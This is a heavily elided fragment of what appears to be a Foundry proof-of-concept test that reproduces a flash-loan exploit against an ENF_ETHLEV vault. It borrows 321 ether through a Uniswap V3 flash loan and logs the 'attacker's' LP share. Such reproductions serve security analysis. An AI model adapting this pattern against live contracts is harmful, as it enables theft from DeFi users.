...
contract ContractTest is Test {
    ...
    function testExploit() external {
        ...
        Pair.flash(address(this), 0, 321 ether, abi.encode(321 ether));
    ...
    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        ...
        emit log_named_decimal_uint("[*] Attacker's LP share after withdrawn", ENF_ETHLEV.balanceOf(address(this)), ENF_ETHLEV.decimals());
